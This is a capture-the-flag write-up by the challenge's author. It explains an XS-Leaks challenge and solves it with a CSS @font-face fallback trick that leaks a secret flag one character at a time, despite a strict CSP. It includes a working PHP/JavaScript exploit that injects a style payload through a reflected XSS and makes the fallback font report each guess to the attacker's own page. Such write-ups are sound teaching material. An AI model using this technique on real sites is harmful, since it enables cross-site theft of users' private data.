In December I released an [XS-Leaks](https://xsleaks.dev/) [challenge](https://twitter.com/RenwaX23/status/1476523375761756162?s=20) and got one solve from [kunte](https://twitter.com/kunte_ctf)

**Challenge brakedown**

- `Main page` is just a normal static page to interact with other pages
- `POST /note` you can use to upload anything to the server
- `GET /note` will display contents of your uploaded file
- `GET /search` will search for your input and if the contains the flag it will show you your uploaded file content otherwise just a text not found
- `GET /hack` classic simple XSS via `x` parameter

`/note` and `/search` Content-Type is text/plain 

Strict Mime type checking is enabled on the whole app using `X-Content-Type-Options: nosniff`

Very strict CSP also `script-src 'none' ;img-src 'none' ;media-src 'none' ;frame-ancestors 'none' ;frame-src 'none' ;object-src 'none' ;manifest-src 'none'`

The goal is to leak the flag with XS-Search from `/hack` and use `/search` to get a characters one by one, you can download the challenge code [here](https://drive.google.com/file/d/1L8CPwOvXKgnwQS7WGqUuEg4lGr7RzWwk/view) and play with it locally before cåhecking the solution.


**Solution**

When first interacting with it you might get a lot of solutions and ideas in mind but unfortunately from what I tested just one will work

In CSS you can register new fonts for your page using [@font-face](https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face) then you can use that font to apply on any element, also we have [font fallback](https://stackoverflow.com/a/4673992) for browser compatibility. It's possible for an element to have many fonts like `h1{font-family: first, second}` the browser first will check if the system or page supports `first` if not it will fallback to display the content font based on `second` 

Using this trick we can use it for our challenge, first we will upload a new font (woff2 is best) then with the XSS register two new fonts `first` it will point to `/search?q=flag{` and `second` font will point to our webhook `example.com`, add a new element and set the fonts to it, the browser will send a request to `/search?q=flag{` and register the `first` font if our search is true that means the page is valid and the parser is able to parse the font and it will show the element with it therefore `second` font is not called, but if the page responds with `Not Found` it will show a font parsing error and fallback to `second` wich will make a request to our webhook. that way we know the character is not correct and continue bruteforcing until we don't get a request.


**Solution Code**

First upload a woff2 font and change `target` to your challenge url

```php
<?php  
isset($_GET['source']) && highlight_file(__FILE__) && die();

if(isset($_GET['cc'])){
$fp = fopen('data.txt', 'w');
fwrite($fp, $_GET['cc']);  
fclose($fp);  
}

if(isset($_GET['clear'])){
$fp = fopen('data.txt', 'w');
fwrite($fp, "");  
fclose($fp);  
}
?>  

<body onclick="start();this.removeAttribute('onclick')">
<h1 id=state></h1>
<br>
<h1 id=log>click me</h1>

<script>
var target = 'http://localhost:5566'
var win=''
var flag = 'flag{'
var chs ='abcdefghijklmnopqrstuvwxyz_0123456789}'
var arr=chs.split('')
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
var current=''
var correct=false;

function start(){
    fetch(location.href+'?&clear=1')
    win = window.open('about:blank','win'); leak();
}

async function leak(){
for(x in arr){
current=arr[x];
state.innerText='Checking: '+current
win.location=`${target}/hack?x=%3Cstyle%3E+@font-face+{+font-family:+check;+src:+url(%22search/?q=${flag+current}%22)+}+@font-face+{+font-family:+leak;+src:+url(%22${location.href}?cc=${current}%22)+}+h1+{+font-family:++check,+leak+}+%3C/style%3E+%3Ch1%3Ehello`;
await sleep(400);
await check()
if(correct)
break;

}
}



async function check(){
await fetch(location.href.substring(0, location.href.lastIndexOf('/'))+'/data.txt',{cache:'no-cache'}).then((v)=>v.text()).then((v)=>{
if(current!=v){
correct=true;
flag+=current
fetch(location.href+'?&clear=1')
if(v!='}'){
setTimeout(()=>{correct=false;leak()},400)
}
}
})
log.innerText=flag
}
</script>
</body>

```
